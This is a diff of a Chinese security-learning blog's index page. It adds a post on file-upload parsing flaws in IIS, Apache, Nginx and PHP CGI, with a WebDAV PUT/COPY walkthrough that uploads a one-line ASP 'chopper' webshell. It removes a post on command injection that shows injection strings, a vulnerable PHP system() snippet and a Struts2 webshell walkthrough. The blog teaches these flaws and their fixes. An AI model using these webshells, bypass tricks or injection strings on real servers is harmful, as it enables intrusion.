@@ -5,15 +5,15 @@
   
   <title>liuqi</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="吃吃睡睡终其一生">
+  <meta name="description" content="春天的春，晴天的晴">
 <meta property="og:type" content="website">
 <meta property="og:title" content="liuqi">
 <meta property="og:url" content="http://yoursite.com/index.html">
 <meta property="og:site_name" content="liuqi">
-<meta property="og:description" content="吃吃睡睡终其一生">
+<meta property="og:description" content="春天的春，晴天的晴">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="liuqi">
-<meta name="twitter:description" content="吃吃睡睡终其一生">
+<meta name="twitter:description" content="春天的春，晴天的晴">
   
     <link rel="alternate" href="/atom.xml" title="liuqi" type="application/atom+xml">
   
@@ -63,6 +63,69 @@
 </header>
       <div class="outer">
         <section id="main">
+  
+    <article id="post-文件上传之解析漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="2016/08/11/文件上传之解析漏洞/" class="article-date">
+  <time datetime="2016-08-11T11:14:21.000Z" itemprop="datePublished">2016-08-11</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="categories/WEB/">WEB</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="2016/08/11/文件上传之解析漏洞/">文件上传之解析漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a><strong>解析漏洞</strong></h2><figure class="highlight plain"><figcaption><span>常见Web容器有IIS、Nginx、Apache、Tomcat等```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## **IIS解析漏洞**</div></pre></td></tr></table></figure>
+<p>IIS6.0在解析文件时存在以下两个解析漏洞<br>1、当建立<em>.asp、</em>.asa格式的文件夹时，其目录下任意文件都会被iis当作asp文件来解析。<br>2、当文件为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure></p>
+<p>WebDav漏洞<br>    WebDav是一种基于HTTP1.1协议的通信协议，它扩展了HTTP协议。在开启WebDav后若<br>支持PUT、Move、Copy、Delete等方法，就会存在安全隐患。</p>
+<p>测试步骤如下：<br>    1）通过OPTIONS探测服务器所支持的HTTP方法<br>    请求：<br>    OPTIONS / HTTP/1.1<br>    Host: www.xxxx.com<br>    2)通过PUT方法向服务器上传shell<br>    请求：<br>    PUT /a.txt HTTP/1.1<br>    Host: www.xxxx.com<br>    Content-Length: 30</p>
+<pre><code>&lt;%eval request(&quot;chopper&quot;) %&gt;
+3)通过Move或Copy方法改名
+请求：
+COPY /a.txt HTTP/1.1
+Host: www.xxxx.com
+Destination: http://www.xxxx.com/cmd.asp
+4)用DELETE方法删除文件
+请求：
+DELETE /a.txt HTTP/1.1
+Host: www.xxxx.com
+</code></pre><p>注：可用桂林老兵的IIS Write快速探测服务器是否存在WebDav漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## *Apache解析漏洞*</div></pre></td></tr></table></figure></p>
+<p>在Apache 1.x和Apache 2.x中存在解析漏洞。 Apache在解析文件时有一个原则，当碰到不认识的扩展名时，将会从后向前解析， 直到碰到认识的扩展名为止，如果都不认识，则会暴露其源代码。 如：1.php.rar.sa.xs就会被解析为php，可以据此来绕过文件名限制 可以在Apache安装目录下的文件”/conf/mime.types”中配置Apache可以识别的文件名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## *Nginx解析漏洞*</div></pre></td></tr></table></figure></p>
+<p>对低版本的Nginx可以在任意文件名后添加%00.php进行解析攻击 如：上传图片xx.jpg，然后通过改名为xx.jpg%00.php就会解析为php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## *PHP CGI解析漏洞*</div></pre></td></tr></table></figure></p>
+<p>当php的配置文件中的选项cgi.fix_pathinfo = 1开启时，当访问<a href="http://www.xxx.com/x.txt/x.php" target="_blank" rel="external">http://www.xxx.com/x.txt/x.php</a><br>时，若x.php不存在，则PHP会递归向前解析，将x.txt当作php脚本来解析</p>
+<p>IIS7.0/7.5中：任意文件名/任意文件名.php就会被解析为php<br>Nginx中：任意文件名/任意文件名.php就会被解析为php<br>```</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/08/11/文件上传之解析漏洞/" data-id="cirq8inqh002058hrsk5ct6yn" class="article-share-link">Share</a>
+      
+        <a href="http://yoursite.com/2016/08/11/文件上传之解析漏洞/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/上传/">上传</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
   
     <article id="post-centos搭建tomcat以及漏洞利用" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -160,7 +223,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/08/centos搭建tomcat以及漏洞利用/" data-id="cirlvgsgo0001nchrfliy49e8" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/08/centos搭建tomcat以及漏洞利用/" data-id="cirq8inlr000158hrjc907zq6" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/08/08/centos搭建tomcat以及漏洞利用/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -214,7 +277,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/05/webshell的获取与查杀/" data-id="cirlvgsk8001bnchr2bjxiycz" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/05/webshell的获取与查杀/" data-id="cirq8inot001958hr0n3nclbg" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/08/05/webshell的获取与查杀/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -260,7 +323,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/05/redis漏洞利用/" data-id="cirlvgsir000pnchr9o2ljyr4" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/05/redis漏洞利用/" data-id="cirq8innf000p58hr1xxn2wph" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/08/05/redis漏洞利用/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -308,7 +371,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/05/redis的安装/" data-id="cirlvgsiv000rnchrwkguij1n" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/05/redis的安装/" data-id="cirq8inn5000k58hrlcququta" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/08/05/redis的安装/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -358,7 +421,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/05/centos6-5samba服务器的搭建/" data-id="cirlvgsge0000nchrzd9uq8e2" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/05/centos6-5samba服务器的搭建/" data-id="cirq8inlh000058hrsxdms0vj" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/08/05/centos6-5samba服务器的搭建/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -413,7 +476,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/04/逻辑漏洞/" data-id="cirlvgsm10026nchrk3z2xoln" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/04/逻辑漏洞/" data-id="cirq8inrb002e58hrp9833ixf" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/08/04/逻辑漏洞/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -464,7 +527,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/01/敏感信息泄露/" data-id="cirlvgslg001tnchrsfi61xdz" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/01/敏感信息泄露/" data-id="cirq8inpx001r58hre12ypfoe" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/08/01/敏感信息泄露/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -514,7 +577,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/07/30/文件包含漏洞/" data-id="cirlvgslw0023nchrku1eeazl" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/07/30/文件包含漏洞/" data-id="cirq8inqr002658hr4e2bvl8k" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/07/30/文件包含漏洞/#disqus_thread" class="article-comment-link">Comments</a>
       
@@ -573,86 +636,9 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/07/30/任意代码执行漏洞/" data-id="cirlvgsko001knchrkhj8jfe4" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/07/30/任意代码执行漏洞/" data-id="cirq8inpn001n58hr2t50ywd4" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/07/30/任意代码执行漏洞/#disqus_thread" class="article-comment-link">Comments</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/执行/">执行</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="2016/07/29/命令执行漏洞/" class="article-date">
-  <time datetime="2016-07-29T07:44:30.000Z" itemprop="datePublished">2016-07-29</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="categories/WEB/">WEB</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="2016/07/29/命令执行漏洞/">命令执行漏洞</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数<br>主要是以Php为主，php中可以调用外部程序的常见的函数：system,exec,shell_exec,passthru,popen,proc_popen </p>
-<h2 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h2><ul>
-<li>1.应用调用执行系统命令的函数</li>
-<li>2.将用户输入作为系统命令的参数拼接到命令行中</li>
-<li>3.没有对用户进行输入过滤或者过滤不严<blockquote>
-<ul>
-<li>利用goole搜索 inurl:关键字：action<h2 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h2></li>
-</ul>
-</blockquote>
-</li>
-<li>1.代码层过滤不严</li>
-<li>2.系统的漏洞造成</li>
-<li><p>3调用.第三方组件存在代码执行漏洞<br>如WordPress中用来处理图片的ImageMagick组件<br>JAVA中的命令执行漏洞(struts2/ElasticsearchGroovy等) ThinkPHP命令执行</p>
-<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><ol>
-<li>继承Web服务程序的权限去执行系统命令或读写文件</li>
-<li>反弹shell</li>
-<li>控制整个网站甚至控制服务器</li>
-<li>进一步内网渗透</li>
-<li>等等</li>
-</ol>
-</li>
-</ul>
-<h3 id="漏洞可能的代码"><a href="#漏洞可能的代码" class="headerlink" title="漏洞可能的代码"></a>漏洞可能的代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1. system(&quot;$arg&quot;);  //直接输入即可2. system(&quot;/bin/prog $arg&quot;);  //直接输入;ls3. system(&quot;/bin/prog -p $arg&quot;);  //和2一样4. system(&quot;/bin/prog --p=\&quot;$arg\&quot;&quot;);  //可以输入&quot;;ls;&quot;5. system(&quot;/bin/prog --p=&apos;$arg&apos;&quot;);  //可以输入&apos;;ls;&apos;</div></pre></td></tr></table></figure>
-<p>在Linux上，上面的;也可以用|、||代替<br>    ;前面的执行完执行后面的<br>    |是管道符，显示后面的执行结果<br>    ||当前面的执行出错时执行后面的</p>
-<p>在Windows上，不能用;可以用&amp;、&amp;&amp;、|、||代替<br>    &amp;前面的语句为假则直接执行后面的<br>    &amp;&amp;前面的语句为假则直接出错，后面的也不执行<br>    |直接执行后面的语句<br>    ||前面出错执行后面的</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h2><p>示例一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">       $arg = $_GET[&apos;cmd&apos;];</div><div class="line">        if ($arg)&#123;</div><div class="line">             system(&quot;$arg&quot;);</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
-<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a><strong>漏洞修复</strong></h2><pre><code>1. 尽量少用执行命令的函数或者直接禁用
-2. 参数值尽量使用引号包括
-3. 在使用动态函数之前，确保使用的函数是指定的函数之一
-4. 在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义
-</code></pre><p>&lt;?php<br>    $arg = $_GET[‘cmd’];<br>    // $arg = addslashes($arg);<br>    $arg = escapeshellcmd($arg);  //拼接前就处理<br>    if ($arg) {<br>        system(“ls -al ‘$arg’”);<br>    }<br>?&gt;</p>
-<h2 id="下面是struct2漏洞实列"><a href="#下面是struct2漏洞实列" class="headerlink" title="下面是struct2漏洞实列"></a><strong>下面是struct2漏洞实列</strong></h2><p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/6/1.png?raw=true" alt="image"><br>存在漏洞，下载一个漏洞的利用工具<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/6/2.png?raw=true" alt="image"><br>可以任意执行命令，在目标信息中获取路径信息<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/6/3.png?raw=true" alt="image"><br>在文件上传可以传一个jsp的小马<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/6/4.png?raw=true" alt="image"></p>
-<p>ok用菜刀连接就可以使用<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/6/5.png?raw=true" alt="image"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/07/29/命令执行漏洞/" data-id="cirlvgskv001nnchrwk3xmnfi" class="article-share-link">Share</a>
-      
-        <a href="http://yoursite.com/2016/07/29/命令执行漏洞/#disqus_thread" class="article-comment-link">Comments</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/执行/">执行</a></li></ul>
@@ -667,7 +653,7 @@
 
 
   <nav id="page-nav">
-    <span class="page-number current">1</span><a class="page-number" href="page/2/">2</a><a class="page-number" href="page/3/">3</a><a class="extend next" rel="next" href="page/2/">__('next') &raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="page/2/">2</a><a class="page-number" href="page/3/">3</a><a class="page-number" href="page/4/">4</a><a class="extend next" rel="next" href="page/2/">__('next') &raquo;</a>
   </nav>
 </section>
         
@@ -697,7 +683,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="tags/centos/" style="font-size: 16.67px;">centos</a> <a href="tags/csrf/" style="font-size: 10px;">csrf</a> <a href="tags/github/" style="font-size: 10px;">github</a> <a href="tags/google/" style="font-size: 10px;">google</a> <a href="tags/linux问题/" style="font-size: 10px;">linux问题</a> <a href="tags/mysql/" style="font-size: 10px;">mysql</a> <a href="tags/redis/" style="font-size: 13.33px;">redis</a> <a href="tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="tags/sql注入/" style="font-size: 20px;">sql注入</a> <a href="tags/tcp-ip/" style="font-size: 10px;">tcp/ip</a> <a href="tags/tomcat/" style="font-size: 10px;">tomcat</a> <a href="tags/webshell/" style="font-size: 10px;">webshell</a> <a href="tags/win2003/" style="font-size: 10px;">win2003</a> <a href="tags/xss/" style="font-size: 13.33px;">xss</a> <a href="tags/上传/" style="font-size: 13.33px;">上传</a> <a href="tags/执行/" style="font-size: 13.33px;">执行</a> <a href="tags/敏感信息/" style="font-size: 10px;">敏感信息</a> <a href="tags/文件包含/" style="font-size: 10px;">文件包含</a> <a href="tags/流程/" style="font-size: 10px;">流程</a> <a href="tags/逻辑/" style="font-size: 10px;">逻辑</a>
+      <a href="tags/centos/" style="font-size: 16.67px;">centos</a> <a href="tags/csrf/" style="font-size: 10px;">csrf</a> <a href="tags/github/" style="font-size: 10px;">github</a> <a href="tags/google/" style="font-size: 10px;">google</a> <a href="tags/linux问题/" style="font-size: 10px;">linux问题</a> <a href="tags/mysql/" style="font-size: 10px;">mysql</a> <a href="tags/redis/" style="font-size: 13.33px;">redis</a> <a href="tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="tags/sql注入/" style="font-size: 20px;">sql注入</a> <a href="tags/tcp-ip/" style="font-size: 10px;">tcp/ip</a> <a href="tags/tomcat/" style="font-size: 10px;">tomcat</a> <a href="tags/webshell/" style="font-size: 10px;">webshell</a> <a href="tags/win2003/" style="font-size: 10px;">win2003</a> <a href="tags/xss/" style="font-size: 13.33px;">xss</a> <a href="tags/上传/" style="font-size: 16.67px;">上传</a> <a href="tags/执行/" style="font-size: 13.33px;">执行</a> <a href="tags/敏感信息/" style="font-size: 10px;">敏感信息</a> <a href="tags/文件包含/" style="font-size: 10px;">文件包含</a> <a href="tags/流程/" style="font-size: 10px;">流程</a> <a href="tags/逻辑/" style="font-size: 10px;">逻辑</a>
     </div>
   </div>
 
@@ -719,6 +705,10 @@
       <ul>
         
           <li>
+            <a href="2016/08/11/文件上传之解析漏洞/">文件上传之解析漏洞</a>
+          </li>
+        
+          <li>
             <a href="2016/08/08/centos搭建tomcat以及漏洞利用/">centos搭建tomcat以及漏洞利用</a>
           </li>
         
@@ -732,10 +722,6 @@
         
           <li>
             <a href="2016/08/05/redis的安装/">redis的安装</a>
-          </li>
-        
-          <li>
-            <a href="2016/08/05/centos6-5samba服务器的搭建/">centos6.5samba服务器的搭建</a>
           </li>
         
       </ul>
